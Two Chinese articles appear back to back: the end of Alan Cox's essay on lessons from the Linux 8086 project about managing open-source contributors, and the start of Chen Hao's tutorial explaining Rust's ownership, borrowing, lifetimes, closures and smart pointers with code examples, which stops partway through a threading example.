像Linux这种基于用户/程序员的项目成长缓慢，虽然它是靠着一群贡献代码的人得以成长起来，但这些人的背景要么是从原始的Minix（注，一种微内核操作系统）黑客社区起家，要么通过艰难的方式不断从头学起。随着项目增长，人们本应该形成一个“Linux内核结构规划管理委员会”，而不是掉入将人们招来唤去，不将失败视为问题的怪圈，用Linus的话来说就是“给我看源码”。如果有人陷入困境，他可以发帖询问，在这之前包括现在很大程度上都基于人们正常地拥有时间并具备知识来回复他。在Linux 8086的案例中，开发人员很长一段时间身陷囹圄。假使主动活跃的程序员对只有潜在用处的妄想型码农的比例更高一点的话，我们就可以将一些杂音转化成生产力。项目也就获得更多有用的程序员，他们可以轮流向他人传授经验，任何学习活动都会让你变得更好，哪怕只有一些少量实习生。一些人会认为你无法将那些“次要程序员”(lesser programmer)训练成真正的程序员。就Linux项目的个人经验而言，很多人员只要获得一丁点儿的帮助和自信鼓励都将成为世界上最好的开发人员之一。只要帮助和鼓励足够多，很多人就能成功。Linux 8086总算大部分从“侵扰”中恢复过来，可至今仍是个不起眼的小项目。你可以从CVS目录树上下载这个由Alistair Riddich领导的项目，他做了很多优秀的工作。随着市议员的撤出，人们可以询问、参与并改善这个项目。
我们从这个项目，还有其它相同命运的早期Linux 16位处理器项目（有的已死）中很清楚地学到以下几点教训。* 从项目一开始就发布源代码。哪怕不是很有用也无关紧要，将市议会排序分类的最好方式就是发布源代码并告知人们。Linux、KDE以及GNOME都遵循这种方式并获益良多。你可以花一辈子时间去争论怎样写代码才是正确的。只要代码公布，人们（不管水平怎样）都会把玩它。* 要欣赏那些给一点帮助就会对项目做出巨大贡献的人。如果他们最初的补丁有错误，不要盛气凌人，向其解释问题出在哪里并给出解决方案的建议，或者可以查询解决方法的地方。解答真正的问题，帮助别人，你所花费的一分一秒都会成十倍地回报在项目上，对社会也会带来无法估量的好处。[注]* 不要忘记那些非开发人员。我难过地发现许多人问起“前5名最重要的内核成员”时却极少涉及在所有人中最重要的一些——他们负责维护网站，更新日志和邮件列表，还有编辑文档，这些都是同等重要。   Linus那句“给我看源代码”对真正的项目来说是个狭隘的视角。当你听到人们说“我很想帮忙，可我不会编程”，那么他可以从事文档编写。当人们说“但英语不是我的第一语言”，这时你需要的是一位文档编辑或另一门语言翻译者。
* 尝试将有用的人从杂音中分离出来，将有意愿帮忙的人从一大堆无聊评论中分离出来是很难的。在Linux 8086项目中我的确错误地放弃了这一目标，如何将那些只会空谈而又无所事事的人弄走是一门学问。下次碰到人们在项目上投票，或者问题讨论了一个月才实现这类情况，给予他们警告。这样才能使人正确地解决问题。在你看来如果一些稀奇古怪的事务不顾一切地运行着，要求他们给你发个补丁，只要能够生效的话。小心地说“我们应该怎样”之类的话，对“我该如何做”这样的人伸出援手。Alan[注]这段话举个例子说明一下。Linux IPv6源码作者以前在葡萄牙上网聊天，只会简单讨论和问一些基本问题。我们助其弄明白一些内核原理之后，他写了大约75%的IPv6协议栈代码，他最近受聘于美国思科公司。附录一：一篇针对本文的吐槽贴附录二：2009年Cox回复Torvalds的邮件，事情起因是Cox的一个tty patch导致kdesu(KDE project’s su utility)程序无法工作，该问题争论长达两个星期，此后Alan离开了Linux项目投奔Intel。# Rust语言的编程范式作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
总是有很多很多人来问我对Rust语言怎么看的问题，在各种地方被at，其实，我不是很想表达我的想法。因为在不同的角度，你会看到不同的东西。编程语言这个东西，老实说很难评价，在学术上来说，Lisp就是很好的语言，然而在工程使用的时候，你会发现Lisp没什么人用，而Javascript或是PHP这样在学术很糟糕设计的语言反而成了主流，你觉得C++很反人类，在我看来，C++有很多不错的设计，而且对于了解编程语言和编译器的和原理非常有帮助。 **但是C++也很危险，所以，出现在像Java或Go 语言来改善它，Rust本质上也是在改善C++的。他们各自都有各自的长处和优势** 。因为各个语言都有好有不好，因此，我不想用别的语言来说Rust的问题，或是把Rust吹成朵花以打压别的语言，写成这样的文章，是很没有营养的事。 **本文主要想通过Rust的语言设计来看看编程中的一些挑战，尤其是Rust重要的一些编程范式，这样反而更有意义一些，因为这样你才可能一通百通** 。这篇文章的篇幅比较长，而且有很多代码，信息量可能会非常大，所以， **在读本文前，你需要有如下的知识准备** ：* 你对C++语言的一些特性和问题比较熟悉。尤其是：指针、引用、右值move、内存对象管理、泛型编程、智能指针……   * 当然，你还要略懂Rust，不懂也没太大关系，但本文不会是Rust的教程文章，可以参看“Rust的官方教程”（中文版）
**因为本文太长，所以，我有必要写上 TL;DR ——**Java 与 Rust 在改善C/C++上走了完全不同的两条路，他们主要改善的问题就是C/C++ Safety的问题。所谓C/C++编程安全上的问题，主要是：内存的管理、数据在共享中出现的“野指针”、“野引用”的问题。* 对于这些问题，Java用引用垃圾回收再加上强大的VM字节码技术可以进行各种像反射、字节码修改的黑魔法。   * 而Rust不玩垃圾回收，也不玩VM，所以，作为静态语言的它，只能在编译器上下工夫。如果要让编译器能够在编译时检查出一些安全问题，那么就需要程序员在编程上与Rust语言有一些约定了，其中最大的一个约定规则就是变量的所有权问题，并且还要在代码上“去糖”，比如让程序员说明一些共享引用的生命周期。   * Rust的这些所有权的约定造成了很大的编程上的麻烦，写Rust的程序时，基本上来说，你的程序再也不要想可能轻轻松松能编译通过了。而且，在面对一些场景的代码编写时，如：函数式的闭包，多线程的不变数据的共享，多态……开始变得有些复杂，并会让你有种找不到北的感觉。   * Rust的Trait很像Java的接口，通过Trait可以实现C++的拷贝构造、重载操作符、多态等操作……   * 学习Rust的学习曲线并不平，用Rust写程序，基本上来说，一旦编译通过，代码运行起来是安全的，bug也是很少的。
**如果你对Rust的概念认识的不完整，你完全写不出程序，那怕就是很简单的一段代码** 。 **这逼着程序员必需了解所有的概念才能编码。但是，另一方面也表明了这门语言并不适合初学者……**目录* 变量的可变性   * 变量的所有权   * Owner语义带来的复杂度   * 引用（借用）和生命周期     * 引用（借用）     * 生命周期   * 闭包与所有权     * 函数闭包     * 线程闭包   * Rust的智能指针   * 线程与智能指针   * 多态和运行时识别     * 通过Trait多态     * 向下转型   * Trait 重载操作符   * 小结#### 变量的可变性首先，Rust里的变量声明默认是“不可变的”，如果你声明一个变量 `let x = 5;` 变量 `x` 是不可变的，也就是说，`x = y + 10;` 编译器会报错的。如果你要变量的话，你需要使用 `mut` 关键词，也就是要声明成 `let mut x = 5;` 表示这是一个可以改变的变量。这个是比较有趣的，因为其它主流语言在声明变量时默认是可变的，而Rust则是要反过来。这可以理解，不可变的通常来说会有更好的稳定性，而可变的会代来不稳定性。所以，Rust应该是想成为更为安全的语言，所以，默认是 immutable 的变量。当然，Rust同样有 `const` 修饰的常量。于是，Rust可以玩出这么些东西来：
* 常量：`const LEN:u32 = 1024;` 其中的 `LEN` 就是一个`u32` 的整型常量（无符号32位整型），是编译时用到的。   * 可变的变量： `let mut x = 5;` 这个就跟其它语言的类似， 在运行时用到。   * 不可变的变量：`let x= 5;` 对这种变量，你无论修改它，但是，你可以使用 `let x = x + 10;` 这样的方式来重新定义一个新的 `x`。这个在Rust里叫 Shadowing ，第二个 `x` 把第一个 `x` 给遮蔽了。不可变的变量对于程序的稳定运行是有帮助的，这是一种编程“契约”，当处理契约为不可变的变量时，程序就可以稳定很多，尤其是多线程的环境下，因为不可变意味着只读不写，其他好处是，与易变对象相比，它们更易于理解和推理，并提供更高的安全性。有了这样的“契约”后，编译器也很容易在编译时查错了。这就是Rust语言的编译器的编译期可以帮你检查很多编程上的问题。对于标识不可变的变量，在 C/C++中我们用`const` ，在Java中使用 `final` ，在 C#中使用 `readonly` ，Scala用 `val` ……（在Javascript 和Python这样的动态语言中，原始类型基本都是不可变的，而自定义类型是可变的）。
对于Rust的Shadowing，我个人觉得是比较危险的，在我的职业生涯中，这种使用同名变量（在嵌套的scope环境下）带来的bug还是很不好找的。一般来说，每个变量都应该有他最合适的名字，最好不要重名。#### 变量的所有权这个是Rust这个语言中比较强调的一个概念。其实，在我们的编程中，很多情况下，都是把一个对象（变量）传递过来传递过去，在传递的过程中，传的是一份复本，还是这个对象本身，也就是所谓的“传值还是传引用”的被程序员问得最多的问题。* **传递副本（传值）** 。把一个对象的复本传到一个函数中，或是放到一个数据结构容器中，可能需要出现复制的操作，这个复制对于一个对象来说，需要深度复制才安全，否则就会出现各种问题。而深度复制就会导致性能问题。   * **传递对象本身（传引用）** 。传引用也就是不需要考虑对象的复制成本，但是需要考虑对象在传递后，会多个变量所引用的问题。比如：我们把一个对象的引用传给一个List或其它的一个函数，这意味着，大家对同一个对象都有控制权，如果有一个人释放了这个对象，那边其它人就遭殃了，所以，一般会采用引用计数的方式来共享一个对象。引用除了共享的问题外，还有作用域的问题，比如：你从一个函数的栈内存中返回一个对象的引用给调用者，调用者就会收到一个被释放了个引用对象（因为函数结束后栈被清了）。
这些东西在任何一个编程语言中都是必需要解决的问题，要足够灵活到让程序员可以根据自己的需要来写程序。在C++中，如果你要传递一个对象，有这么几种方式：* **引用或指针。** 也就是不建复本，完全共享，于是，但是会出现悬挂指针（Dangling Pointer）又叫野指针的问题，也就是一个指针或引用指向一块废弃的内存。为了解决这个问题，C++的解决方案是使用 `share_ptr` 这样的托管类来管理共享时的引用计数。   * **传递复本** ，传递一个拷贝，需要重载对象的“拷贝构造函数”和“赋值构造函数”。   * **移动Move** 。C++中，为了解决一些临时对象的构造的开销，可以使用Move操作，把一个对象的所有权移动到给另外一个对象，这个解决了C++中在传递对象时的会产生很多临时对象来影响性能的情况。C++的这些个“神操作”，可以让你非常灵活地在各种情况下传递对象，但是也提升整体语言的复杂度。而Java直接把C/C++的指针给废了，用了更为安全的引用 ，然后为了解决多个引用共享同一个内存，内置了引用计数和垃圾回收，于是整个复杂度大大降低。对于Java要传对象的复本的话，需要定义一个通过自己构造自己的构造函数，或是通过prototype设计模式的 `clone()` 方法来进行，如果你要让Java解除引用，需要明显的把引用变量赋成 `null` 。总之，无论什么语言都需要这对象的传递这个事做好，不然，无法提供相对比较灵活编程方法。
在Rust中，Rust强化了“所有权”的概念，下面是Rust的所有者的三大铁律：1. Rust 中的每一个值都有一个被称为其 **所有者** （owner）的变量。   2. 值有且只有一个所有者。   3. 当所有者（变量）离开作用域，这个值将被丢弃。这意味着什么？如果你需要传递一个对象的复本，你需要给这个对象实现 `Copy` trait ， **trait** 怎么翻译我也不知道，你可以认为是一个对象的一些特别的接口（可以用于一些对像操作上的约定，比如：`Copy` 用于复制（类型于C++的拷贝构造和赋值操作符重载），`Display` 用于输出（类似于Java的 `toString()`），还有 `Drop` 和操作符重载等等，当然，也可以是对象的方法，或是用于多态的接口定义，后面会讲）。对于内建的整型、布尔型、浮点型、字符型、多元组都被实现了 `Copy` 所以，在进行传递的时候，会进行`memcpy` 这样的复制（bit- wise式的浅拷贝）。而对于对象来说，则不行，在Rust的编程范式中，需要使用的是 `Clone` trait。于是，`Copy` 和 `Clone` 这两个相似而又不一样的概念就出来了，`Copy` 主要是给内建类型，或是由内建类型全是支持 `Copy` 的对象，而 `Clone` 则是给程序员自己复制对象的。嗯，这就是浅拷贝和深拷贝的差别，`Copy` 告诉编译器，我这个对象可以进行 bit-wise的复制，而 `Clone` 则是指深度拷贝。
像 `String` 这样的内部需要在堆上分布内存的数据结构，是没有实现`Copy` 的（因为内部是一个指针，所以，语义上是深拷贝，浅拷贝会招至各种bug和crash），需要复制的话，必需手动的调用其 `clone()` 方法，如果不这样的的话，当在进行函数参数传递，或是变量传递的时候，所有权一下就转移了，而之前的变量什么也不是了（这里编译器会帮你做检查有没有使用到所有权被转走的变量）。这个相当于C++的Move语义。参看下面的示例，你可能对Rust自动转移所有权会有更好的了解（代码中有注释了，我就不多说了）。// takes_ownership 取得调用函数传入参数的所有权，因为不返回，所以变量进来了就出不去了     fn takes_ownership(some_string: String) {     println!("{}", some_string);     } // 这里，some_string 移出作用域并调用 drop 方法。占用的内存被释放// gives_ownership 将返回值移动给调用它的函数     fn gives_ownership() -> String {     let some_string = String::from("hello"); // some_string 进入作用域.     some_string // 返回 some_string 并移出给调用的函数     }
// takes_and_gives_back 将传入字符串并返回该值     fn takes_and_gives_back(mut a_string: String) -> String {     a_string.push_str(", world");     a_string  // 返回 a_string 将所有权移出给调用的函数     }fn main()     {     // gives_ownership 将返回值移给 s1     let s1 = gives_ownership();     // 所有权转给了 takes_ownership 函数, s1 不可用了     takes_ownership(s1);     // 如果编译下面的代码，会出现s1不可用的错误     // println!("s1= {}", s1);     //                    ^^ value borrowed here after move     let s2 = String::from("hello");// 声明s2     // s2 被移动到 takes_and_gives_back 中, 它也将返回值移给 s3。     // 而 s2 则不可用了。     let s3 = takes_and_gives_back(s2);     //如果编译下面的代码，会出现可不可用的错误     //println!("s2={}, s3={}", s2, s3);     //                         ^^ value borrowed here after move     println!("s3={}", s3);     }
这样的 Move 的方式，在性能上和安全性上都是非常有效的，而Rust的编译器会帮你检查出使用了所有权被move走的变量的错误。而且，我们还可以从函数栈上返回对象了，如下所示：fn new_person() -> Person {     let person = Person {     name : String::from("Hao Chen"),     age : 44,     sex : Sex::Male,     email: String::from("[[email protected]](/cdn-cgi/l/email-protection)"),     };     return person;     }因为对象是Move走的，所以，在函数上 `new_person()` 上返回的 `Person` 对象是Move 语言，被Move到了 `main()` 函数中来，这样就没有性能上的问题了。而在C++中，我们需要把对象的Move函数给写出来才能做到。因为，C++默认是调用拷贝构造函数的，而不是Move的。#### Owner语义带来的复杂度Owner + Move 的语义也会带来一些复杂度。首先，如果有一个结构体，我们把其中的成员 Move 掉了，会怎么样。参看如下的代码：
#[derive(Debug)] // 让结构体可以使用 {:?}的方式输出     struct Person {     name :String,     email:String,     }let _name = p.name; // 把结构体 Person::name Move掉     println!("{} {}", _name, p.email); //其它成员可以正常访问     println!("{:?}", p); //编译出错 "value borrowed here after partial move"     p.name = "Hao Chen".to_string(); // Person::name又有了。     println!("{:?}", p); //可以正常的编译了上面这个示例，我们可以看到，结构体中的成员是可以被Move掉的，Move掉的结构实例会成为一个部分的未初始化的结构，如果需要访问整个结构体的成员，会出现编译问题。但是后面把 Person::name补上后，又可以愉快地工作了。下面我们再看一个更复杂的示例——这个示例模拟动画渲染的场景，我们需要有两个buffer，一个是正在显示的，另一个是下一帧要显示的。
struct Render {     current_buffer : Buffer,     next_buffer : Buffer,     }     //实现结构体 Render 的方法     impl Render {     //实现 update_buffer() 方法，     //更新buffer，把 next 更新到 current 中，再更新 next     fn update_buffer(& mut self, buf : String) {     self.current_buffer = self.next_buffer;     self.next_buffer = Buffer{ buffer: buf};     }     }上面这段代码，我们写下来没什么问题，但是 Rust 编译不会让我们编译通过。它会告诉我们如下的错误：error[E0507]: cannot move out of self.next_buffer which is behind a mutable reference     --> /.........../xxx.rs:18:31     |     14 | self.current_buffer = self.next_buffer;     |                          ^^^^^^^^^^^^^^^^ move occurs because self.next_buffer has type Buffer,     which does not implement the Copy trait
编译器会提示你，`Buffer` 没有 Copy trait 方法。 **但是，如果你实现了 Copy 方法后，你又不能享受 Move 带来的性能上快乐了。于是，到这里，你开始进退两难了，完全不知道取舍了** 。* Rust编译器不让我们在成员方法中把成员Move走，因为 `self` 引用就不完整了。   * Rust要我们实现 `Copy` Trait，但是我们不想要拷贝，因为我们就是想把 `next_buffer` move 到 `current_buffer` 中我们想要同时 Move 两个变量，参数 `buf` move 到 `next_buffer` 的同时，还要把 `next_buffer` 里的东西 move 到 `current_buffer` 中。 我们需要一个“杂耍”的技能。这个需要动用 `std::mem::replace(&dest, src)` 函数了， 这个函数技把 `src` 的值 move 到 `dest` 中，然后把 `dest` 再返回出来（这其中使用了 unsafe 的一些底层骚操作才能完成）。Anyway，最终是这样实现的：不知道你觉得这样“杂耍”的代码看上去怎么以样？我觉得可读性下降一个数量级。
#### 引用（借用）和生命周期下面，我们来讲讲引用，因为把对象的所有权 Move 走了的情况，在一些时候肯定不合适，比如，我有一个 `compare(s1: Student, s2: Student) -> bool` 我想比较两个学生的平均份成绩， 我不想传复本，因为太慢，我也不想把所有权交进去，因为只是想计算其中的数据。这个时候，传引用就是一个比较好的选择，Rust同样支持传引用。只需要把上面的函数声明改成：`compare(s1 :&Student, s2 : &Student) -> bool` 就可以了，在调用的时候，`compare (&s1, &s2);` 与C++一致。在Rust中，这也叫“借用”（嗯，Rust发明出来的这些新术语，在语义上感觉让人更容易理解了，当然，也增加了学习的复杂度了）##### 引用（借用）另外，如果你要修改这个引用对象，就需要使用“可变引用”，如：`foo( s : &mut Student)` 以及 `foo( &mut s);`另外，为了避免一些数据竞争需要进行数据同步的事，Rust严格规定了—— **在任意时刻，要么只能有一个可变引用，要么只能有多个不可变引用** 。
这些严格的规定会导致程序员失去编程的灵活性，不熟悉Rust的程序员可能会在一些编译错误下会很崩溃，但是你的代码的稳定性也会提高，bug率也会降低。另外，Rust为了解决“野引用”的问题，也就是说，有多个变量引用到一个对象上，还不能使用额外的引用计数来增加程序运行的复杂度。那么，Rust就要管理程序中引用的生命周期了，而且还是要在编译期管理，如果发现有引用的生命周期有问题的，就要报错。比如：上面的这段代码，程序员肉眼就能看到 `x` 的作用域比 `r` 小，所以导致 `r` 在 `println()` 的时候 `r` 引用的 `x` 已经没有了。这个代码在C++中可以正常编译而且可以执行，虽然最后可以打出“内嵌作用域”的 `x` 的值，但其实这个值已经是有问题的了。而在 Rust 语言中，编译器会给出一个编译错误，告诉你，“`x` dropped here while still borrowed”，这个真是太棒了。但是这中编译时检查的技术对于目前的编译器来说，只在程序变得稍微复杂一点，编译器的“失效引用”检查就不那么容易了。比如下面这个代码：let str1 = String::from("long long long long string");     let str2 = "short string";
let (long_str, short_str) = order_string(str1.as_str(), str2);我们有两个字符串，`str1` 和 `str2` 我们想通过函数 `order_string()` 把这两个字串符返回成 `long_str` 和 `short_str` 这样方便后面的代码进行处理。这是一段很常见的处理代码的示例。然而，你会发现，这段代码编译不过。编译器会告诉你，`order_string()` 返回的 引用类型 `&str` 需要一个 lifetime的参数 – “ expected lifetime parameter”。这是因为Rust编译无法通过观察静态代码分析返回的两个引用返回值，到底是`(s1, s2)` 还是 `(s2, s1)` ，因为这是运行时决定的。所以，返回值的两个参数的引用没法确定其生命周期到底是跟 `s1` 还是跟 `s2`，这个时候，编译器就不知道了。##### 生命周期如果你的代码是下面这个样子，编程器可以自己推导出来，函数 `foo()` 的参数和返回值都是一个引用，他们的生命周期是一样的，所以，也就可以编译通过。而对于传入多个引用，返回值可能是任一引用，这个时候编译器就犯糊涂了，因为不知道运行时的事，所以，就需要程序员来标注了。
上述的Rust的标注语法，用个单引号加一个任意字符串来标注（`'static`除外，这是一个关键词，表示生命周期跟整个程序一样长），然后，说明返回的那两个引用的生命周期跟 `s1` 和 `s2` 的生命周期相同，这个标注的目的就是把运行时的事变成了编译时的事。于是程序就可以编译通过了。（注：你也不要以为你可以用这个技术乱写生命周期，这只是一种“去语法糖操作”，是帮助编译器理解其中的生命周期，如果违反实际生命周期，编译器也是会拒绝编译的）这里有两个说明，* 只要你玩引用，生命周期标识就会来了。   * Rust编译器不知道运行时会发生什么事，所以，需要你来标注声明我感觉，你现在开始有点头晕了吧？接下来，我们让你再晕一下。比如：如果你要在结构体中玩引用，那必需要为引用声明生命周期，如下所示：// 引用 ref1 和 ref2 的生命周期与结构体一致     struct Test <'life> {     ref_int : &'life i32,     ref_str : &'life str,     }其中，生命周期标识 `'life` 定义在结构体上，被使用于其成员引用上。意思是声明规则——“ **结构体的生命周期 <= 成员引用的生命周期**”
然后，如果你要给这个结构实现两个 `set` 方法，你也得带上 lifetime 标识。在上面的这个示例中，生命周期变量 `'life` 声明在 `impl` 上，用于结构体和其方法的入参上。 意思是声明规则——“ **结构体方法的“引用参数”的生命周期 >= 结构体的生命周期**”有了这些个生命周期的标识规则后，Rust就可以愉快地检查这些规则说明，并编译代码了。#### 闭包与所有权这种所有权和引用的严格区分和管理，会影响到很多地方，下面我们来看一下函数闭包中的这些东西的传递。函数闭包又叫Closure，是函数式编程中一个不可或缺的东西，又被称为lambda表达式，基本上所有的高级语言都会支持。在 Rust 语言中，其闭包函数的表示是用两根竖线（| |）中间加传如参数进行定义。如下所示：// 定义了一个 x + y 操作的 lambda f(x, y) = x + y;     let plus = |x: i32, y:i32| x + y;     // 定义另一个lambda g(x) = f(x, 5)     let plus_five = |x| plus(x, 5);     //输出     println!("plus_five(10)={}", plus_five(10) );
##### 函数闭包但是一旦加上了上述的所有权这些东西后，问题就会变得复杂开来。参看下面的代码。fn main() {     let p = Person{ name: "Hao Chen".to_string(), age : 44};     //可以运行，因为 u8 有 Copy Trait     let age = |p : Person| p.age;     // String 没有Copy Trait，所以，这里所有权就 Move 走了     let name = |p : Person | p.name;     println! ("name={}, age={}" , name(p), age(p));     }上面的代码无法编译通过，因为Rust编译器发现在调用 `name(p)` 的时候，`p` 的所有权被移走了。然后，我们想想，改成引用的版本，如下所示：let age = |p : &Person| p.age;     let name = |p : &Person | &p.name;你会现在还是无法编译，报错中说： **cannot infer an appropriate lifetime for borrow expression due to conflicting requirements**
error[E0495]: cannot infer an appropriate lifetime for borrow expression due to conflicting requirements     --> src/main.rs:11:31     |     11 |     let name = |p : &Person | &p.name;     |                               ^^^^^^^然后你开始尝试加 lifetime，用尽各种Rust的骚操作（官方Github上的 #issue 58052），然后，还是无法让你的程序可以编译通过。最后，上StackOverflow 里寻找帮助，得到下面的正确写法（这个可能跟这个bug有关系：#issue 41078 ）。但是这样的写法，已经让简洁的代码变得面目全非。//下面的声明可以正确译     let name: for<'a> fn(&'a Person) -> &'a String = |p: &Person| &p.name;上面的这种lifetime的标识也是很奇葩，通过定义一个函数类型来做相关的标注，但是这个函数类型，需要用到 `for<'a>` 关键字。你可能会很confuse这个关键字不是用来做循环的吗？嗯，Rust这种重用关键字的作法，我个人觉得带来了很多不必要的复杂度。总之，这样的声明代码，我觉得基本不会有人能想得到的——“去语法糖操作太严重了，绝大多数人绝对hold不住”！
最后，我们再来看另一个问题，下面的代码无法编译通过：Rust的编译器会告诉你，`take_str` 把 `s` 的所有权给拿走了（因为需要作成返回值）。所以，后面的输出语句就用不到了。这里意味着：* 对于内建的类型，都实现了 `Copy` 的 trait，那么闭包执行的是 “借用”   * 对于没有实现 `Copy` 的trait，在闭包中可以调用其方法，是“借用”，但是不能当成返回值，当成返回值了就是“移动”。虽然有了这些“通常情况下是借用的潜规则”，但是还是不能满足一些情况，所以，还要让程序员可以定义 `move` 的“明规则”。下面的代码，一个有 move 一个没有move，他们的差别也不一样。//-----------借用的情况-----------     let mut num = 5;     {     let mut add_num = |x: i32| num += x;     add_num(5);     }     println!("num={}", num); //输出 10//-----------Move的情况-----------     let mut num = 5;     {     // 把 num（5）所有权给 move 到了 add_num 中，     // 使用其成为闭包中的局部变量。     let mut add_num = move |x: i32| num += x;     add_num(5);     println!("num(move)={}", num); //输出10     }     //因为i32实现了 Copy，所以，这里还可以访问     println!("num(move)={}", num); //输出5
真是有点头大了，int这样的类型，因为实现了Copy Trait，所以，所有权被移走后，意味着，在内嵌块中的`num` 和外层的 `num` 是两个完全不相干的变量。 **但是你在读代码的时候，你的大脑可能并不会让你这么想，因为里面的那个num又没有被声明过，应该是外层的** 。我个人觉得这是Rust 各种“按下葫芦起了瓢”的现象。##### 线程闭包通过上面的示例，我们可以看到， `move` 关键词，可以把闭包外使用到的变量给移动到闭包内，成为闭包内的一个局部变量。这种方式，在多线程的方式下可以让线程运行地更为的安全。参看如下代码：首先，线程 `thread::spawn()` 里的闭包函数是不能带参数的，因为是闭包，所以可以使用这个可见范围内的变量，但是，问题来了，因为是另一个线程，所以，这代表其和其它线程（如：主线程）开始共享数据了，所以，在Rust下，要求把使用到的变量给 Move 到线程内，这就保证了安全的问题—— `name` 在线程中永远不会失效，而且不会被别人改了。你可能会有一些疑问，你会质疑到* 一方面，这个 `name` 变量又没有声明成 `mut` 这意味着不变，没必要使用move语义也是安全的。   * 另一方面，如果我想把这个 `name` 传递到多个线程里呢？
嗯，是的，但是Rust的线程必需是 move的，不管是不是可变的，不然编译不过去。如果你想把一个变量传到多个线程中，你得创建变量的复本，也就是调用 `clone()` 方法。然后，你说，这种clone的方式成本不是很高？设想，如果我要用多线程对一个很大的数组做统计，这种clone的方式完全吃不消。嗯，是的。这个时候，需要使用另一个技术，智能指针了。#### Rust的智能指针如果你看到这里还不晕的话，那么，我的文章还算成功（如果晕的话，请告诉我，我会进行改善）。接下来我们来讲讲Rust的智能指针和多态。因为有些内存需要分配在Heap（堆）上，而不是Stack（堆）上，Stack上的内存一般是编译时决定的，所以，编译器需要知道你的数组、结构体、枚举等这些数据类型的长度，没有长度是无法编译的，而且长度也不能太大，Stack上的内存大小是有限，太大的内存会有StackOverflow的错误。所以，对于更大的内存或是动态的内存分配需要分配在Heap上。学过C/C++的同学对于这个概念不会陌生。Rust 作为一个内存安全的语言，这个堆上分配的内存也是需要管理的。在C中，需要程序员自己管理，而在C++中，一般使用 RAII 的机制（面向对象的代理模式），一种通过分配在Stack上的对象来管理Heap上的内存的技术。在C++中，这种技术的实现叫“智能指针”（Smart Pointer）。
在C++11中，会有三种智能指针（这三种指针是什么我就不多说了）：* `unique_ptr`。独占内存，不共享。在Rust中是：`std::boxed::Box`   * `shared_ptr`。以引用计数的方式共享内存。在Rust中是：`std::rc::Rc`   * `weak_ptr`。不以引用计数的方式共享内存。在Rust中是：`std::rc::Weak`对于独占的 `Box` 不多说了，这里重点说一下共享的 `Rc` 和 `Weak` ：* 对于Rust的 Rc 来说，Rc指针内会有一个 `strong_count` 的引用持计数，一旦引用计数为0后，内存就自动释放了。   * 需要共享内存的时候，需要调用实例的 `clone()` 方法。如： `let another = rc.clone()` 克隆的时候，只会增加引用计数，不会作深度复制（个人觉得Clone的语义在这里被践踏了）   * 有这种共享的引用计数，就意味着有多线程的问题，所以，如果需要使用线程安全的智能指针，则需要使用`std::sync::Arc`   * 可以使用 `Rc::downgrade(&rc)` 后，会变成 Weak 指针，Weak指针增加的是 `weak_count` 的引用计数，内存释放时不会检查它是否为 0。
我们简单的来看个示例：use std::rc::Rc;     use std::rc::Weak//声明两个未初始化的指针变量     let weak : Weak;     let strong : Rc;     {     let five = Rc::new(5); //局部变量     strong = five.clone(); //进行强引用     weak = Rc::downgrade(&five); //对局部变量进行弱引用     }     //此时，five已析构，所以 Rc::strong_count(&strong)=1， Rc::weak_count(&strong)=1     //如果调用 drop(strong)，那个整个内存就释放了     //drop(strong);//如果要访问弱引用的值，需要把弱引用 upgrade 成强引用，才能安全的使用     match  weak_five.upgrade() {     Some(r) => println!("{}", r),     None => println!("None"),     }
上面这个示例比较简单，其中主要展示了，指针共享的东西。因为指针是共享的，所以，对于强引用来说，最后的那个人把引用给释放了，是安全的。但是对于弱引用来说，这就是一个坑了，你们强引用的人有Ownership，但是我们弱引用没有，你们把内存释放了，我怎么知道？于是， **在弱引用需要使用内存的时候需要“升级”成强引用 ，但是这个升级可能会不成功，因为内存可能已经被别人清空了** 。所以，这个操作会返回一个 `Option` 的枚举值，`Option::Some(T)` 表示成功了，而 `Option::None` 则表示失改了。你会说，这么麻烦，我们为什么还要 `Weak` ? 这是因为强引用的 `Rc` 会有循环引用的问题……（学过C++的都应该知道）另外，如果你要修改 `Rc` 里的值，Rust 会给你两个方法，一个是 `get_mut()`，一个是 `make_mut()` ，这两个方法都有副作用或是限制。`get_mut()` 需要做一个“唯一引用”的检查，也就是没有任何的共享才能修改//修改引用的变量 - get_mut 会返回一个Option对象     //但是需要注意，仅当（只有一个强引用 && 没有弱引用）为真才能修改     if let Some(val) = Rc::get_mut(&mut strong) {     *val = 555;     }
`make_mut()` 则是会把当前的引用给clone出来，再也不共享了， 是一份全新的。//此处可以修改，但是是以 clone 的方式，也就是让strong这个指针独立出来了。     *Rc::make_mut(&mut strong) = 555;如果不这样做，就会出现很多内存不安全的情况。 **这些小细节一定要注意，不然你的代码怎么运作的你会一脸蒙逼的** 。嗯，如果你想更快乐地使用智能指针，这里还有个选择 – `Cell` 和 `RefCell`，它们弥补了 Rust 所有权机制在灵活性上和某些场景下的不足。他们提供了 `set()`/`get()` 以及 `borrow()`/`borrow_mut()` 的方法，让你的程序更灵活，而不会被限制得死死的。参看下面的示例。use std::cell::Cell;     use std::cell::RefCelllet x = Cell::new(1);     let y = &x; //引用（借用）     let z = &x; //引用（借用）     x.set(2); // 可以进行修改，x，y，z全都改了     y.set(3);     z.set(4);     println!("x={} y={} z={}", x.get(), y.get(), z.get());
通过上面的示例你可以看到你可以比较方便地更为正常的使用智能指针了。然而，需要注意的是 `Cell` 和 `RefCell` 不是线程安全的。在多线程下，需要使用Mutex进行互斥。#### 线程与智能指针现在，我们回来来解决前面那还没有解决的问题，就是——我想在多个线程中共享一个只读的数据，比如：一个很大的数组，我开多个线程进行并行统计。我们肯定不能对这个大数组进行clone，但也不能把这个大数组move到一个线程中。根据上述的智能指针的逻辑，我们可以通过智指指针来完成这个事，下面是一个例程：const TOTAL_SIZE:usize = 100 * 1000; //数组长度     const NTHREAD:usize = 6; //线程数let data : Vec<i32> = (1..(TOTAL_SIZE+1) as i32).collect(); //初始化一个数据从1到n数组     let arc_data = Arc::new(data); //data 的所有权转给了 ar_data     let result  = Arc::new(AtomicU64::new(0)); //收集结果的数组(原子操作)
